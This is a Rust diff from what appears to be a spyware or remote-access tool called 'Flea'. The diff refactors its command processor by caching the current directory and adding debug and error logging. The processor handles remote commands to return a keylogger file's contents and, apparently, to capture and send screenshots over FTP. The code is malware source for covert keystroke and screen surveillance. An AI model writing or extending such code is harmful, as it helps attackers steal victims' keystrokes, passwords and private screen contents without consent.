@@ -3,13 +3,12 @@ extern crate repng;
 extern crate serde;
 
 use serde::{Serialize, Deserialize};
-use std::process::{Stdio};
+use std::process::Stdio;
 use execute::{Execute, command};
 use ftp::{FtpError, FtpStream};
-use std::{io::Cursor, str, fs::File, io::Read, env, io::ErrorKind::WouldBlock};
+use std::{io::Cursor, str, fs::File, io::Read, env, thread, io::ErrorKind::WouldBlock};
 use std::path::PathBuf;
 use scrap::{Capturer, Display};
-use std::thread;
 use std::time::Duration;
 use log::{debug, error};
 use chrono::{DateTime, Utc};
@@ -46,6 +45,7 @@ struct FleaConfig
 pub struct CommandProcessor
 {
     version: u8,
+    current_directory: PathBuf,
     conf: FleaConfig,
 }
 
@@ -254,7 +254,12 @@ impl FleaCommand for CommandProcessor
 {
     fn new() -> Self
     {
-        Self { version: FLEA_PROTOCOL_VERSION, 
+        debug!("Creating FleaCommand..");
+
+        Self 
+        { 
+            version: FLEA_PROTOCOL_VERSION,
+
             conf: match confy::load("flea_conf")
             {
                 Ok(x) =>
@@ -265,7 +270,19 @@ impl FleaCommand for CommandProcessor
                 {
                     panic!("Configuration error {}", e.to_string())
                 }
-            } 
+            },
+            
+            current_directory: match env::current_dir() 
+            {
+                Ok(x) =>
+                {
+                    x
+                },
+                Err(y) =>
+                {
+                    panic!("Couldn't get current directory: {}", y.to_string())
+                }
+            }
         }
     }
 
@@ -273,7 +290,7 @@ impl FleaCommand for CommandProcessor
     /// * cmd - a command in a form of a string
     /// * value - an additional data related to a command
     fn process(&self, cmd: &str, value: &str) -> String
-    {
+    {        
         match cmd
         {
             GET_VERSION_COMMAND =>
@@ -288,14 +305,8 @@ impl FleaCommand for CommandProcessor
 
             SEND_KEY_LOGGER_FILE_COMMAND =>
             {
-                if let Ok(x) = env::current_dir() 
-                {
-                    let current_path = x.join(KEY_LOGGER_FILE_NAME).to_str().unwrap().to_string();
-                    return get_key_logger_content(&current_path);
-                };
-
-                error!("Get current firectory failed!");
-                return "".to_string();
+                let current_path = self.current_directory.join(KEY_LOGGER_FILE_NAME).to_str().unwrap().to_string();
+                return get_key_logger_content(&current_path);
             },
 
             SEND_PIC_COMMAND =>
@@ -324,9 +335,11 @@ impl FleaCommand for CommandProcessor
                         {
                             Ok(_) =>
                             {
+                                debug!("A temporary file removed.");
                             },
                             Err(_) =>
                             {
+                                error!("Couldn't remove a temp file!");
                             }
                         }
 
